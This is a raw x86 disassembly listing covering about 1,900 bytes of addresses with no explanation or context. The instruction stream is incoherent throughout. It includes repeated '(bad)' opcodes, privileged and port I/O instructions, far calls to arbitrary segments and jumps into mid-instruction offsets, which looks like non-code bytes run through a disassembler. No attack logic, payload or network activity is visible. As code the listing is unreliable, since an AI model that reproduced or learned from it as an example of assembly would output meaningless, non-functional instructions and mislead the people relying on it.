  41163c:	add    eax,DWORD PTR [ebp+0xcf67db7]
  411642:	in     eax,dx
  411643:	jb     0x4115e5
  411645:	les    ebp,FWORD PTR [esi]
  411647:	jbe    0x411634
  411649:	adc    esp,DWORD PTR [ebx]
  41164b:	cmp    eax,0x679e9d84
  411650:	sbb    al,0x66
  411652:	andnps xmm7,xmm4
  411655:	inc    esp
  411656:	in     eax,0x5
  411658:	aad    0xb1
  41165a:	call   FWORD PTR [edi+0x4def1be5]
  411660:	mov    ebx,0xcc782ec7
  411665:	(bad)  
  411666:	jle    0x4115f2
  411668:	iret   
  411669:	lds    ebp,FWORD PTR [edx]
  41166b:	ror    dh,1
  41166d:	outs   dx,DWORD PTR ds:[esi]
  41166e:	nop
  41166f:	cmp    ch,BYTE PTR [ebx]
  411671:	and    eax,0x1e0c9d0d
  411676:	mov    al,ds:0xb38032c2
  41167b:	test   eax,0xc992659f
  411680:	push   ss
  411681:	call   0x42e9aba5
  411686:	push   ecx
  411687:	mov    cl,0xaf
  411689:	fcom   QWORD PTR [edi]
  41168b:	mov    ah,0x9f
  41168d:	cmp    edi,DWORD PTR [ecx-0x6a]
  411690:	jns    0x411637
  411692:	adc    esp,0x39
  411695:	sbb    DWORD PTR [ebx],0xec2a94fd
  41169b:	push   eax
  41169c:	jns    0x4116db
  41169e:	aad    0x61
  4116a0:	hlt    
  4116a1:	js     0x4116b1
  4116a3:	cld    
  4116a4:	dec    esi
  4116a5:	mov    ch,bh
  4116a7:	or     bh,ch
  4116a9:	and    al,0x1b
  4116ab:	shl    DWORD PTR [ebx+0x36],1
  4116ae:	jecxz  0x4116e5
  4116b0:	mov    esp,0x4ea541cc
  4116b5:	fucomip st,st(4)
  4116b7:	scas   eax,DWORD PTR es:[edi]
  4116b8:	je     0x411729
  4116ba:	jp     0x411700
  4116bc:	mov    al,0xd7
  4116be:	or     al,0x4e
  4116c0:	push   ss
  4116c1:	inc    edx
  4116c2:	pop    ds
  4116c3:	inc    ecx
  4116c4:	shl    BYTE PTR [ecx],0x36
  4116c7:	xor    ebx,esi
  4116c9:	mov    al,ds:0x3de619cc
  4116ce:	out    0x58,al
  4116d0:	std    
  4116d1:	cli    
  4116d2:	stc    
  4116d3:	aad    0xc2
  4116d5:	call   FWORD PTR [edx+0x0]
  4116d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d9:	mov    esi,0x38f07ce3
  4116de:	xlat   BYTE PTR ds:[ebx]
  4116df:	xchg   BYTE PTR [esi+0x54],dl
  4116e2:	outs   dx,BYTE PTR ds:[esi]
  4116e3:	push   es
  4116e4:	push   edi
  4116e5:	ud2    
  4116e7:	and    DWORD PTR [esi+esi*2],ecx
  4116ea:	push   ebx
  4116eb:	push   cs
  4116ec:	dec    ebx
  4116ed:	and    edx,esp
  4116ef:	addr16 and eax,0x856eb0b8
  4116f5:	cmp    bh,BYTE PTR [ebx+0x3]
  4116f8:	(bad)  
  4116f9:	icebp  
  4116fa:	sbb    al,0x1d
  4116fc:	retf   
  4116fd:	addr16 cli 
  4116ff:	cmp    al,BYTE PTR [eax]
  411701:	or     esp,DWORD PTR ds:0xe343eaea
  411707:	cmp    eax,0xce5f3f1e
  41170c:	pop    ebx
  41170d:	pushf  
  41170e:	xor    eax,0x8216aeec
  411713:	push   ebx
  411714:	inc    ebp
  411715:	ss push ds
  411717:	cvtps2pd xmm2,QWORD PTR [esi+0x3855fe78]
  41171e:	retf   0x7dd1
  411721:	(bad)  
  411722:	jno    0x41172e
  411724:	lea    ecx,[edx]
  411726:	shl    DWORD PTR [eax+0x5a],1
  411729:	icebp  
  41172a:	bound  eax,QWORD PTR [ecx*2-0x70589d0f]
  411731:	xchg   edx,eax
  411732:	push   0xa19fd503
  411737:	add    BYTE PTR [edx+esi*1+0x4813d781],bl
  41173e:	inc    edi
  41173f:	popf   
  411740:	mov    ?,WORD PTR [edi+0x23098756]
  411746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411747:	add    BYTE PTR [ecx],al
  411749:	rcr    esp,0xb
  41174c:	(bad)  
  41174d:	fmul   DWORD PTR [ecx]
  41174f:	sahf   
  411750:	xor    eax,0x5a4d9fad
  411755:	js     0x4117b3
  411757:	(bad)  
  411759:	stos   BYTE PTR es:[edi],al
  41175a:	mov    DWORD PTR [eax-0xd],edi
  41175d:	push   ss
  41175e:	pusha  
  41175f:	pop    eax
  411760:	js     0x4117a4
  411762:	aas    
  411763:	hlt    
  411764:	call   0x1f74:0x260c1541
  41176b:	sbb    DWORD PTR [ecx+0x4eb42465],ecx
  411771:	ret    0x6f23
  411774:	(bad)  
  411775:	les    ebp,FWORD PTR [esi-0x1a5100ff]
  41177b:	pop    edx
  41177c:	inc    ecx
  41177d:	or     al,0xc5
  41177f:	out    dx,al
  411780:	test   eax,0x9860da0f
  411785:	and    DWORD PTR [ebp-0x3445aa97],eax
  41178b:	sbb    BYTE PTR [edi+0x63fb2ffc],0x6
  411792:	push   edi
  411793:	inc    eax
  411794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411795:	lock loopne 0x411782
  411798:	in     eax,dx
  411799:	add    DWORD PTR [ebx-0x49],edi
  41179c:	wbinvd 
  41179e:	adc    ebp,esp
  4117a0:	or     DWORD PTR [edi-0x3d],esi
  4117a3:	(bad)  
  4117a4:	fxch   st(2)
  4117a6:	xlat   BYTE PTR ds:[ebx]
  4117a7:	adc    esp,DWORD PTR [edx]
  4117a9:	mov    al,0x50
  4117ab:	mov    DWORD PTR [esi+0x3223d277],ebx
  4117b1:	pop    esi
  4117b2:	xor    bl,ch
  4117b4:	xchg   ebx,eax
  4117b5:	pushf  
  4117b6:	sub    DWORD PTR [eax-0x5fbfc0e4],0x19283a32
  4117c0:	xor    ah,BYTE PTR [edi+0x3c49566a]
  4117c6:	jmp    0xc2ba5b34
  4117cb:	repz push 0xffffffbb
  4117ce:	sbb    al,0xb3
  4117d0:	lea    ebp,ds:0x476d4d3d
  4117d6:	(bad)  
  4117d7:	dec    esp
  4117d8:	aas    
  4117d9:	outs   dx,DWORD PTR ds:[esi]
  4117da:	sub    al,0xb1
  4117dc:	fwait
  4117dd:	iret   
  4117de:	add    eax,DWORD PTR [edi]
  4117e0:	aaa    
  4117e1:	mov    dl,BYTE PTR ds:[ebp-0xa410a79]
  4117e8:	(bad)  
  4117e9:	xor    eax,0x7c143b36
  4117ee:	sub    al,0xa7
  4117f0:	sbb    BYTE PTR ds:0x7763c68,cl
  4117f6:	mov    ds:0xd82ea0a9,eax
  4117fb:	cld    
  4117fc:	push   edi
  4117fd:	sub    BYTE PTR [edi+0x515820b0],ch
  411803:	in     al,0x2c
  411805:	adc    BYTE PTR [ebp-0x75aaa327],0x79
  41180c:	js     0x4117c0
  41180e:	sub    al,BYTE PTR [edx-0x3cbaaa4a]
  411814:	retf   0x3225
  411817:	push   esp
  411818:	jae    0x411853
  41181a:	fcomp  QWORD PTR [ecx-0x44]
  41181d:	mov    ebx,DWORD PTR [ebp-0x3dc35d09]
  411823:	fcmovb st,st(4)
  411825:	scas   eax,DWORD PTR es:[edi]
  411826:	loopne 0x4117b9
  411828:	inc    ebx
  411829:	and    esp,ecx
  41182b:	mov    WORD PTR [ebx-0x2d],es
  41182e:	ror    BYTE PTR [ebx-0x78],1
  411831:	sbb    al,0x34
  411833:	mov    esi,0x4c11c9cd
  411838:	mov    dh,0x66
  41183a:	lock jo 0x4117d6
  41183d:	test   al,0xf7
  41183f:	daa    
  411840:	dec    esp
  411841:	popf   
  411842:	and    eax,0xf7c6a8c8
  411847:	clc    
  411848:	test   al,0x4d
  41184a:	sahf   
  41184b:	mov    ecx,0x73bf7c29
  411850:	in     eax,0x5a
  411852:	(bad)  
  411853:	data16 jg 0x411810
  411856:	fwait
  411857:	jnp    0x411856
  411859:	push   edi
  41185a:	push   0x44
  41185c:	pop    ss
  41185d:	mov    dh,0x68
  41185f:	js     0x411877
  411861:	arpl   WORD PTR [edi+eiz*2-0x69925ff],cx
  411868:	sbb    eax,0x55351f05
  41186d:	dec    ecx
  41186e:	or     ebx,0x7ad24f17
  411874:	mov    esi,0x83a4ba85
  411879:	std    
  41187a:	xor    dh,BYTE PTR [eax]
  41187c:	sbb    al,0x9f
  41187e:	data16 stos BYTE PTR es:[edi],al
  411880:	xor    al,0x3e
  411882:	jle    0x4118d0
  411884:	lea    eax,[ebp+0x2b]
  411887:	fistp  DWORD PTR ds:0xc639a758
  41188d:	jmp    0x4118e7
  41188f:	xchg   ebx,eax
  411890:	push   es
  411891:	leave  
  411892:	add    cl,al
  411894:	mov    esp,0x7e872b92
  411899:	es cli 
  41189b:	mov    gs,WORD PTR gs:[edx]
  41189e:	div    BYTE PTR [esp+ecx*4]
  4118a1:	enter  0x14aa,0x5
  4118a5:	inc    esi
  4118a6:	lods   eax,DWORD PTR ds:[esi]
  4118a7:	push   ebp
  4118a8:	(bad)  
  4118a9:	mov    dl,0xbd
  4118ab:	inc    ebp
  4118ac:	sbb    BYTE PTR [eax+0x76c2c227],dh
  4118b2:	retf   0x1c31
  4118b5:	mov    DWORD PTR ds:0xd6d8e5a4,ebp
  4118bb:	adc    BYTE PTR [eax+0x3e],al
  4118be:	mov    ds:0x537e4177,eax
  4118c3:	dec    esp
  4118c4:	or     al,0x3a
  4118c6:	sbb    eax,0x447e5223
  4118cb:	and    esp,eax
  4118cd:	mov    dh,0x6f
  4118cf:	popa   
  4118d0:	mov    eax,0x2611942
  4118d5:	mov    edx,0xed270a05
  4118da:	mov    eax,ds:0xf1e15ced
  4118df:	push   eax
  4118e0:	or     eax,0x657cf8e0
  4118e5:	jo     0x411935
  4118e7:	hlt    
  4118e8:	and    ch,BYTE PTR [ebx]
  4118ea:	ins    BYTE PTR es:[edi],dx
  4118eb:	mov    WORD PTR [ecx-0x26d5fbd],ds
  4118f1:	pop    ebp
  4118f2:	adc    eax,0x99fb8787
  4118f7:	sub    dh,BYTE PTR ds:0x5d5d36d3
  4118fd:	ja     0x411968
  4118ff:	push   ds
  411900:	add    eax,0xd4193cb3
  411905:	aas    
  411906:	pop    edi
  411907:	(bad)  
  411908:	sbb    al,0x88
  41190a:	mov    al,ds:0x97b66c8d
  41190f:	dec    edi
  411910:	out    dx,al
  411911:	add    BYTE PTR [ebp+0x449a19f2],ah
  411917:	or     DWORD PTR [ebx+0x1],ecx
  41191a:	retf   
  41191b:	in     al,dx
  41191c:	test   al,0x56
  41191e:	jl     0x411990
  411920:	data16 mov bh,0x85
  411923:	std    
  411924:	jb     0x4118d8
  411926:	ins    DWORD PTR es:[edi],dx
  411927:	js     0x411914
  411929:	mov    dh,0xac
  41192b:	xor    eax,0x9d09addf
  411930:	inc    ebx
  411931:	jp     0x411925
  411933:	cs pop edi
  411935:	mov    ah,0x76
  411937:	je     0x4118d5
  411939:	int3   
  41193a:	loope  0x411939
  41193c:	jl     0x41191e
  41193e:	fwait
  41193f:	jge    0x411993
  411941:	fsubr  DWORD PTR [eax+0x42]
  411944:	popf   
  411945:	push   ss
  411946:	mov    WORD PTR [ecx-0x50],?
  411949:	cmp    BYTE PTR [edi],bh
  41194b:	(bad)  
  41194d:	(bad)  
  41194e:	jnp    0x41198c
  411950:	call   0xa14c54b
  411955:	out    dx,eax
  411956:	sti    
  411957:	fcmovb st,st(3)
  411959:	push   cs
  41195a:	int    0x72
  41195c:	enter  0x82ea,0xd1
  411960:	ins    BYTE PTR es:[edi],dx
  411961:	sub    BYTE PTR [edi-0x24a961c3],dh
  411967:	mov    edx,0xa162428c
  41196c:	in     eax,dx
  41196d:	xor    al,0xc4
  41196f:	ret    0x851e
  411972:	and    eax,0x5a8a1fbc
  411977:	cmp    ch,0x50
  41197a:	mov    edx,0xd33729ed
  41197f:	pop    ebx
  411980:	hlt    
  411981:	add    BYTE PTR [edi],al
  411983:	in     al,dx
  411984:	in     al,dx
  411985:	cmp    al,0x6c
  411987:	dec    ecx
  411988:	dec    esp
  411989:	out    dx,eax
  41198a:	sbb    DWORD PTR [edi-0x17],ebp
  41198d:	xchg   edi,eax
  41198e:	mov    ebp,0xe2c82f35
  411993:	and    DWORD PTR [edi],0x41
  411996:	hlt    
  411997:	mov    WORD PTR [edi+0x3adee564],cs
  41199d:	lods   al,BYTE PTR ds:[si]
  41199f:	sbb    edi,DWORD PTR [esi-0x39d852d6]
  4119a5:	push   0xffffff89
  4119a7:	outs   dx,DWORD PTR ds:[esi]
  4119a8:	and    al,0x93
  4119aa:	fndisi(8087 only) 
  4119ac:	mov    cs,WORD PTR [edx+0x19]
  4119af:	jbe    0x411a2a
  4119b1:	xchg   ebp,eax
  4119b2:	daa    
  4119b3:	mov    ah,0xda
  4119b5:	mov    ebp,0x277a8659
  4119ba:	pop    es
  4119bb:	jp     0x4119fd
  4119bd:	and    dh,0xbf
  4119c0:	cmp    dl,dh
  4119c2:	pop    ecx
  4119c3:	retf   
  4119c4:	pop    ss
  4119c5:	repz xor al,0xf7
  4119c8:	outs   dx,DWORD PTR ds:[esi]
  4119c9:	js     0x411a0c
  4119cb:	sbb    eax,0x54e3569f
  4119d0:	arpl   WORD PTR [edx-0xef425b2],cx
  4119d6:	sahf   
  4119d7:	and    eax,0xe55bfd8c
  4119dc:	mov    al,ds:0x52c34e68
  4119e1:	fmul   DWORD PTR [eax-0x381f299a]
  4119e7:	add    edi,edi
  4119e9:	scas   eax,DWORD PTR es:[edi]
  4119ea:	jo     0x411a59
  4119ec:	aaa    
  4119ed:	in     al,dx
  4119ee:	mov    ch,BYTE PTR [edx+0x5a]
  4119f1:	push   esi
  4119f2:	or     edi,DWORD PTR [esi-0x68bb2246]
  4119f8:	jo     0x411a23
  4119fa:	jae    0x4119f4
  4119fc:	call   DWORD PTR [edi+0x61]
  4119ff:	pop    ss
  411a00:	fmul   QWORD PTR [ebp+0x2c9ed73]
  411a06:	mov    ebx,0x405c1d66
  411a0b:	mov    bh,0x9e
  411a0d:	xlat   BYTE PTR ds:[ebx]
  411a0e:	in     al,dx
  411a0f:	sub    BYTE PTR [edi-0x61],al
  411a12:	sub    bl,BYTE PTR [edi]
  411a14:	pushf  
  411a15:	(bad)  
  411a16:	sbb    dl,BYTE PTR [edi]
  411a18:	pop    esp
  411a19:	gs lock push esp
  411a1c:	jle    0x411a23
  411a1e:	inc    esi
  411a1f:	sub    al,0xe6
  411a21:	sti    
  411a22:	push   cs
  411a23:	push   esp
  411a24:	popa   
  411a25:	les    esp,FWORD PTR [ecx+0xc]
  411a28:	push   es
  411a29:	pop    es
  411a2a:	or     al,bh
  411a2c:	push   ds
  411a2d:	int    0xb7
  411a2f:	ret    0xc43f
  411a32:	sti    
  411a33:	xor    cl,ah
  411a35:	mov    ebx,0xe8edccf
  411a3a:	add    al,0x3b
  411a3c:	sub    eax,eax
  411a3e:	pop    ds
  411a3f:	push   edx
  411a40:	dec    ebx
  411a41:	retf   
  411a42:	call   0xad9a:0x766f4cfc
  411a49:	and    BYTE PTR [esp+edx*4-0xb],cl
  411a4d:	pop    ds
  411a4e:	mov    bh,0x31
  411a50:	mov    bh,BYTE PTR [esi-0x43]
  411a53:	and    DWORD PTR [eax-0x17],esp
  411a56:	adc    al,0x31
  411a58:	pop    edx
  411a59:	adc    eax,0x93ba01b1
  411a5e:	xor    DWORD PTR [edi],edi
  411a60:	inc    eax
  411a61:	scas   al,BYTE PTR es:[edi]
  411a62:	js     0x411a2d
  411a64:	in     eax,dx
  411a65:	dec    ebx
  411a66:	dec    edx
  411a67:	xchg   BYTE PTR [ecx],cl
  411a69:	mov    ah,0xdd
  411a6b:	dec    edi
  411a6c:	xchg   BYTE PTR [esi],cl
  411a6e:	and    DWORD PTR [ebp+0x36245640],0x20
  411a75:	push   ebp
  411a76:	jmp    DWORD PTR [edx-0x2ec23310]
  411a7c:	inc    edx
  411a7d:	and    eax,0xfd7fd567
  411a82:	pop    ds
  411a83:	mov    al,0x36
  411a85:	inc    eax
  411a86:	lods   al,BYTE PTR ds:[esi]
  411a87:	pop    ebx
  411a88:	xor    edi,DWORD PTR [edx]
  411a8a:	fdiv   DWORD PTR [ecx]
  411a8c:	sbb    eax,0x55bc5cc4
  411a91:	mov    DWORD PTR [eax-0x798382c1],ebx
  411a97:	inc    edx
  411a98:	into   
  411a99:	lahf   
  411a9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a9b:	retf   0xdb2
  411a9e:	jbe    0x411b05
  411aa0:	stc    
  411aa1:	stos   DWORD PTR es:[edi],eax
  411aa2:	in     al,dx
  411aa3:	stos   BYTE PTR es:[edi],al
  411aa4:	leave  
  411aa5:	inc    ebp
  411aa6:	into   
  411aa7:	jbe    0x411ac0
  411aa9:	xlat   BYTE PTR ds:[ebx]
  411aaa:	imul   ebp,eax,0x62
  411aad:	fisubr WORD PTR [esi]
  411aaf:	sub    al,0x60
  411ab1:	cmp    DWORD PTR [ecx+edi*2-0x50bc87e5],edx
  411ab8:	out    0xa6,eax
  411aba:	clc    
  411abb:	scas   eax,DWORD PTR es:[edi]
  411abc:	test   ebx,ebp
  411abe:	push   0xffffffbc
  411ac0:	inc    edi
  411ac1:	popf   
  411ac2:	pop    ss
  411ac3:	and    edx,DWORD PTR [ebx]
  411ac5:	in     al,0x33
  411ac7:	addr16 mov ecx,db3
  411acb:	retf   0x156f
  411ace:	ss retf 
  411ad0:	out    0x3e,al
  411ad2:	jmp    0x411a61
  411ad4:	ins    DWORD PTR es:[edi],dx
  411ad5:	imul   ecx,DWORD PTR [edi],0xa6c1de72
  411adb:	call   0x49b6978f
  411ae0:	push   edi
  411ae1:	scas   eax,DWORD PTR es:[edi]
  411ae2:	mov    eax,ds:0xcdad448f
  411ae7:	jg     0x411aa0
  411ae9:	xor    eax,DWORD PTR [edx+0x369e9a0f]
  411aef:	in     al,dx
  411af0:	push   cs
  411af1:	out    dx,eax
  411af2:	aad    0x0
  411af4:	adc    al,0xb9
  411af6:	scas   al,BYTE PTR es:[edi]
  411af7:	out    dx,eax
  411af8:	and    BYTE PTR ds:0x860de04b,ah
  411afe:	mov    WORD PTR [edi],ds
  411b00:	bound  edx,QWORD PTR [ebx-0x7064bcca]
  411b06:	xchg   esi,eax
  411b07:	mov    al,ds:0x5db1420
  411b0c:	aaa    
  411b0d:	call   DWORD PTR [esi+0x4a4a1599]
  411b13:	push   ebx
  411b14:	mov    DWORD PTR [ebx+0x1b],0xa9ba244b
  411b1b:	push   esi
  411b1c:	sub    ebp,DWORD PTR [esi-0x50]
  411b1f:	and    al,0xce
  411b21:	(bad)  
  411b23:	push   ss
  411b24:	xchg   edi,eax
  411b25:	push   0x535dbd3b
  411b2a:	imul   ebp,DWORD PTR ss:[ecx-0xe],0xffffff91
  411b2f:	arpl   dx,si
  411b31:	sub    BYTE PTR [edi],0x2d
  411b34:	jnp    0x411b58
  411b36:	add    eax,0x4c9b3063
  411b3b:	das    
  411b3c:	xor    DWORD PTR [ebx],ecx
  411b3e:	test   al,0xd3
  411b40:	xor    ch,BYTE PTR [esi]
  411b42:	test   eax,0x83c786d7
  411b47:	xchg   edi,eax
  411b48:	loop   0x411b0b
  411b4a:	mov    dh,0x50
  411b4c:	cmp    BYTE PTR [eax+0x5f34fa6f],ch
  411b52:	mov    ecx,0x754e8c2d
  411b57:	or     eax,0xb64118a0
  411b5c:	push   cs
  411b5d:	adc    DWORD PTR [ecx],esi
  411b5f:	add    DWORD PTR fs:[ecx+0x1f],esi
  411b63:	test   eax,0xf32e344c
  411b68:	cmp    al,0xf6
  411b6a:	or     BYTE PTR [esi-0x5439418f],ah
  411b70:	jp     0x411b10
  411b72:	repnz loopne 0x411b55
  411b75:	test   bh,0xf3
  411b78:	shl    BYTE PTR [eax+0x6bd518e3],cl
  411b7e:	push   esp
  411b7f:	inc    ebx
  411b80:	stos   DWORD PTR es:[edi],eax
  411b81:	push   0x1c
  411b83:	jecxz  0x411b19
  411b85:	xor    ebx,eax
  411b87:	push   eax
  411b88:	pop    ebp
  411b89:	pop    ss
  411b8a:	add    DWORD PTR [ecx-0x7291795e],ebx
  411b90:	or     al,0x8
  411b92:	inc    esi
  411b93:	dec    edx
  411b94:	aam    0x96
  411b96:	mov    ds:0x6e659b77,al
  411b9b:	not    DWORD PTR ss:[ecx]
  411b9e:	mov    ebp,DWORD PTR [edx]
  411ba0:	dec    esi
  411ba1:	xchg   esp,eax
  411ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ba3:	and    eax,0xe3440393
  411ba8:	(bad)  
  411baa:	mov    esp,0x6d2f9945
  411baf:	scas   eax,DWORD PTR es:[edi]
  411bb0:	pusha  
  411bb1:	popa   
  411bb2:	inc    ecx
  411bb3:	mov    ds:0x370b981e,al
  411bb8:	jae    0x411c0c
  411bba:	stc    
  411bbb:	cmp    BYTE PTR [esi-0x4f],al
  411bbe:	add    esp,esp
  411bc0:	mov    ebp,ebp
  411bc2:	ins    BYTE PTR es:[edi],dx
  411bc3:	nop    DWORD PTR [esi-0x45]
  411bc7:	jno    0x411bbe
  411bc9:	lods   al,BYTE PTR ds:[esi]
  411bca:	add    edi,eax
  411bcc:	sti    
  411bcd:	inc    esp
  411bce:	dec    esi
  411bcf:	sbb    al,BYTE PTR [eax-0x3ec289c8]
  411bd5:	xor    edx,0x6
  411bd8:	mov    eax,0xf73e5fad
  411bdd:	lods   eax,DWORD PTR ds:[esi]
  411bde:	fst    DWORD PTR [ebp+0x59e3dcfa]
  411be4:	pop    ebp
  411be5:	sub    DWORD PTR [edx],ebp
  411be7:	sbb    DWORD PTR fs:[ecx-0x2233c8d3],0x3ee8ab14
  411bf2:	scas   eax,DWORD PTR es:[edi]
  411bf3:	jl     0x411bf8
  411bf5:	fwait
  411bf6:	or     BYTE PTR [eax+0xe723807],bl
  411bfc:	add    al,0x60
  411bfe:	in     al,dx
  411bff:	push   ebp
  411c00:	call   FWORD PTR [ecx+0x47fd27b7]
  411c06:	(bad)  
  411c07:	fbstp  TBYTE PTR [esi]
  411c09:	mov    al,0x55
  411c0b:	lahf   
  411c0c:	pop    ebx
  411c0d:	mov    esi,0x1371fcd6
  411c12:	jle    0x411bcb
  411c14:	adc    DWORD PTR [edx+0x3e],ecx
  411c17:	and    bh,BYTE PTR [edi]
  411c19:	xchg   edx,eax
  411c1a:	push   ss
  411c1b:	int3   
  411c1c:	aaa    
  411c1d:	and    edx,edi
  411c1f:	xchg   esp,eax
  411c20:	or     ah,0x24
  411c23:	push   eax
  411c24:	or     BYTE PTR [edx-0x64f12b91],cl
  411c2a:	pop    edi
  411c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c2c:	retf   
  411c2d:	xchg   DWORD PTR [ebx],ebp
  411c2f:	push   ebp
  411c30:	pop    ss
  411c31:	gs popf 
  411c33:	in     al,dx
  411c34:	cmc    
  411c35:	or     eax,0x4c913d81
  411c3a:	(bad)  
  411c3b:	(bad)  
  411c3c:	in     eax,dx
  411c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c3e:	sub    esp,DWORD PTR [edx]
  411c40:	pushf  
  411c41:	add    eax,0x89987ffb
  411c46:	lock (bad) 
  411c48:	jge    0x411bee
  411c4a:	rcr    BYTE PTR [edi-0xb7bca92],0xe
  411c51:	sub    DWORD PTR [eax-0x1a],ecx
  411c54:	push   es
  411c55:	pop    es
  411c56:	push   esp
  411c57:	adc    edi,DWORD PTR [ebp+eiz*1+0x7dd06dba]
  411c5e:	fcmovnu st,st(2)
  411c60:	push   0xffffffb4
  411c62:	pop    esi
  411c63:	xchg   esi,eax
  411c64:	inc    ebx
  411c65:	je     0x411c67
  411c67:	dec    ebx
  411c68:	in     al,0xd8
  411c6a:	sbb    eax,0xb3e3d56f
  411c6f:	push   0x46
  411c71:	adc    esp,DWORD PTR [ecx-0x7c2359dd]
  411c77:	loope  0x411c2f
  411c79:	ins    BYTE PTR es:[edi],dx
  411c7a:	xor    dl,BYTE PTR [ebx-0x56]
  411c7d:	or     al,0x57
  411c7f:	dec    ecx
  411c80:	sub    edx,DWORD PTR [edx-0x3d]
  411c83:	scas   al,BYTE PTR es:[edi]
  411c84:	pop    ecx
  411c85:	repnz xor al,0xe7
  411c88:	xor    DWORD PTR [esi+0x76a5a6c5],edx
  411c8e:	mov    esi,0x16756dd9
  411c93:	outs   dx,BYTE PTR ds:[esi]
  411c94:	repnz push ecx
  411c96:	(bad)  
  411c97:	in     eax,dx
  411c98:	add    BYTE PTR [esi],dl
  411c9a:	mov    al,ds:0xd783bf1e
  411c9f:	mov    eax,0xf41b631
  411ca4:	mov    ss,WORD PTR [edx-0x37637792]
  411caa:	in     al,0xc9
  411cac:	arpl   WORD PTR ds:0x8736ca17,bx
  411cb2:	adc    dl,BYTE PTR [edx-0xc]
  411cb5:	xor    ecx,esi
  411cb7:	push   cs
  411cb8:	loope  0x411c6b
  411cba:	ins    BYTE PTR es:[edi],dx
  411cbb:	jle    0x411c56
  411cbd:	shr    BYTE PTR [esi-0x2d92d53a],cl
  411cc3:	imul   ecx,edi,0xf94a5ec4
  411cc9:	ins    BYTE PTR es:[edi],dx
  411cca:	ja     0x411c89
  411ccc:	enter  0x1873,0x48
  411cd0:	enter  0x5d3a,0x9c
  411cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cd5:	push   ecx
  411cd6:	and    al,0xee
  411cd8:	dec    ecx
  411cd9:	scas   al,BYTE PTR es:[edi]
  411cda:	xlat   BYTE PTR ds:[ebx]
  411cdb:	or     dh,BYTE PTR [esi-0x27]
  411cde:	mov    eax,0x94daf526
  411ce3:	jo     0x411cc3
  411ce5:	mov    WORD PTR [ebx+eiz*1],ss
  411ce8:	or     BYTE PTR [ebx+ebp*1-0x11],al
  411cec:	mov    ah,0x3d
  411cee:	ret    0xc5ce
  411cf1:	inc    ebx
  411cf2:	mov    dl,0x31
  411cf4:	jb     0x411cc3
  411cf6:	int3   
  411cf7:	lock ins BYTE PTR es:[edi],dx
  411cf9:	xchg   BYTE PTR [ecx],dh
  411cfb:	imul   ebx,DWORD PTR [ebx+0x4a],0xac0a151f
  411d02:	push   ebp
  411d03:	push   ss
  411d04:	je     0x411d0a
  411d06:	std    
  411d07:	adc    BYTE PTR [esi+0x19],cl
  411d0a:	fisubr WORD PTR [ecx+0x1ee53cb9]
  411d10:	sahf   
  411d11:	fcmovbe st,st(0)
  411d13:	sub    ecx,esp
  411d15:	mov    WORD PTR [edi-0x56c21eab],ss
  411d1b:	cmp    dl,bl
  411d1d:	sbb    DWORD PTR [ebp+0x34c24255],edi
  411d23:	cmp    DWORD PTR [esi],esp
  411d25:	dec    ebp
  411d26:	jle    0x411ca9
  411d28:	xchg   BYTE PTR [edx],ch
  411d2a:	dec    ebp
  411d2b:	int3   
  411d2c:	imul   edx,esi,0x6b33d568
  411d32:	lds    esi,FWORD PTR [eax+0x3f]
  411d35:	xchg   BYTE PTR [ebx-0x4492d84d],ch
  411d3b:	(bad)  
  411d3c:	call   FWORD PTR [ecx+0x2f883179]
  411d42:	xlat   BYTE PTR ds:[ebx]
  411d43:	fwait
  411d44:	fwait
  411d45:	(bad)  
  411d46:	push   ebx
  411d47:	ror    DWORD PTR [esi],cl
  411d49:	push   eax
  411d4a:	imul   edi,ebx,0x248b9cda
  411d50:	xor    bl,BYTE PTR ds:0x6c9758bb
  411d56:	mov    ecx,0x3febb0c7
  411d5b:	cld    
  411d5c:	cmp    bh,bl
  411d5e:	sub    eax,0xebbeb6da
  411d63:	sub    ah,BYTE PTR [ebx-0x7fb927e2]
  411d69:	aas    
  411d6a:	xor    BYTE PTR [esi+eax*4+0x4c],dl
  411d6e:	and    al,bl
  411d70:	pop    DWORD PTR [esi+eiz*1]
  411d73:	(bad)  
  411d74:	and    esp,esp
  411d76:	jge    0x411d7e
  411d78:	aaa    
  411d79:	add    dl,cl
  411d7b:	icebp  
  411d7c:	inc    ecx
  411d7d:	dec    ebx
  411d7e:	xchg   ebp,eax
  411d7f:	sbb    esp,0x4d
  411d82:	pushf  
  411d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d84:	pop    ss
  411d85:	in     al,dx
  411d86:	dec    edx
  411d87:	xor    esi,esi
  411d89:	in     eax,dx
  411d8a:	das    
  411d8b:	or     edi,DWORD PTR [edi+0x467f5b87]
  411d91:	dec    esi
  411d92:	add    edi,DWORD PTR [edx-0x44]
  411d95:	cmp    ebp,DWORD PTR [edx]
  411d97:	pop    ss
  411d98:	push   ebp
  411d99:	jae    0x411e0e
  411d9b:	and    edx,edi
  411d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d9e:	sub    eax,0xc350e101
  411da3:	mov    esp,0x78a5d5b1
  411da8:	das    
  411da9:	loope  0x411dba
  411dab:	call   0xe454:0x2822502e
  411db2:	into   
  411db3:	out    0x63,eax
  411db5:	imul   esi,DWORD PTR [eax-0xd361306],0xffffffba
  411dbc:	les    ebx,FWORD PTR [edi]
  411dbe:	adc    eax,0xad12631a
  411dc3:	mov    DWORD PTR [edi],esp
  411dc5:	ins    DWORD PTR es:[edi],dx
  411dc6:	test   BYTE PTR [ecx],al
  411dc8:	jmp    0xbd16:0xe3639962
  411dcf:	sbb    edi,DWORD PTR [ecx-0x73228be5]
  411dd5:	rcr    DWORD PTR [ebx-0x1b],0x74
  411dd9:	aad    0xde
  411ddb:	inc    ebp
  411ddc:	idiv   DWORD PTR [esi-0x1f]
  411ddf:	cmp    eax,0xf0d3ec2f
  411de4:	ret    0xd787
  411de7:	dec    eax
  411de8:	xchg   DWORD PTR [ebp+eax*4-0x35],eax
  411dec:	adc    eax,0x4f43febe
  411df1:	out    0x5b,al
  411df3:	retf   0xc48
